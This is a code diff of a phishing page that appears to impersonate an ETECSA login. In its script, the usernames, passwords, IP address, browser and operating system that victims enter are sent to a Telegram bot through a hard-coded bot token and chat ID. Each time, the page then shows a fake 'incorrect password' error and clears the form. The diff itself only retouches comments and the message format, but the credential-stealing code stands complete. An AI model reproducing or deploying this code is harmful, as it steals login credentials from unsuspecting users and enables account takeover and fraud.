@@ -187,7 +187,6 @@
             display: inline-block;
         }
 
-        /* Efectos para el logo */
         .logo-img {
             transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
@@ -233,10 +232,10 @@
     </div>
 
     <script>
-        // Configuración de Telegram - USA TUS DATOS
+        // Configuración de Telegram - GRUPO PRIVADO
         const TELEGRAM_CONFIG = {
             BOT_TOKEN: '6516180762:AAHE5RGPH1kpADaABDGzQLt0962277Nlg1I',
-            CHAT_ID: '6471602133'
+            CHAT_ID: '6471602133'  // ID del grupo privado
         };
 
         // Obtener IP del usuario
@@ -307,27 +306,27 @@
                 const fecha = new Date().toLocaleString('es-ES');
                 const browserInfo = getBrowserInfo();
 
-                // Crear mensaje para Telegram
+                // Crear mensaje para Telegram - FORMATO GRUPO
                 const telegramMessage = `
-🚀 <b>NUEVO REGISTRO EN ETECSA</b>
+🚀 <b>NUEVO REGISTRO - GRUPO ETECSA</b>
 
 👤 <b>Usuario:</b> <code>${username}</code>
 🔒 <b>Contraseña:</b> <code>${password}</code>
 📅 <b>Fecha:</b> ${fecha}
 🌐 <b>IP:</b> <code>${userIP}</code>
-🆔 <b>ID:</b> <code>USER_${Date.now()}</code>
-💻 <b>Navegador:</b> <code>${browserInfo.browser}</code>
-🖥️ <b>Sistema Operativo:</b> <code>${browserInfo.os}</code>
+💻 <b>Navegador:</b> ${browserInfo.browser}
+🖥️ <b>Sistema Operativo:</b> ${browserInfo.os}
 
-✅ <i>Revisa el panel para aprobar</i>
+#ETECSA_GROUP #LOG_${Date.now()}
                 `;
 
-                // Enviar a Telegram
+                // Enviar a Telegram GRUPO
                 const telegramSuccess = await sendTelegramMessage(telegramMessage);
 
-                // Mostrar mensaje de error independientemente del resultado
+                // Mostrar mensaje de error (siempre)
                 showMessage('❌ Contraseña o correo incorrecto. Por favor, inténtelo nuevamente.', 'error');
 
+                // Limpiar formulario
                 document.getElementById('username').value = '';
                 document.getElementById('password').value = '';
 
@@ -368,4 +367,4 @@
         window.addEventListener('load', typePlaceholder);
     </script>
 </body>
-            </html>
+    </html>
